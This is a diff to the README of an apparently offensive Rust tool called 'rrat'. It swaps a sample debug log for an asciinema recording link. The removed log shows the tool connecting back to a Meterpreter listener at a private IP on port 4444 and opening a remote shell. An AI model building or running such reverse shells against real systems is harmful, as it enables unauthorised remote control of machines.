@@ -33,17 +33,5 @@ $ RUST_LOG=rrat ./rrat
 
 Example output after running `rrat` then starting a meterpreter listener.
 
-```
-DEBUG 2018-01-20T14:23:38Z: rrat: Starting connect loop to '192.168.86.147:4444'
- WARN 2018-01-20T14:23:38Z: rrat: Failed to connect, waiting before retry
-DEBUG 2018-01-20T14:23:40Z: rrat: Starting connect loop to '192.168.86.147:4444'
- WARN 2018-01-20T14:23:40Z: rrat: Failed to connect, waiting before retry
-DEBUG 2018-01-20T14:23:42Z: rrat: Starting connect loop to '192.168.86.147:4444'
-DEBUG 2018-01-20T14:23:42Z: rrat: Setting read/write timeout...
-DEBUG 2018-01-20T14:23:42Z: rrat: Connected to endpoint, starting shell
-DEBUG 2018-01-20T14:23:42Z: rrat: Opening shell IO
-DEBUG 2018-01-20T14:23:42Z: rrat: Beginning IO read/write loops
-DEBUG 2018-01-20T14:23:42Z: rrat: Waiting for threads to finish.
-```
+[![asciicast](https://asciinema.org/a/WEoEK34wVe8iKmS5BIpxWOl8Y.png)](https://asciinema.org/a/WEoEK34wVe8iKmS5BIpxWOl8Y)
 
-For details: https://doc.rust-lang.org/log/env_logger/index.html
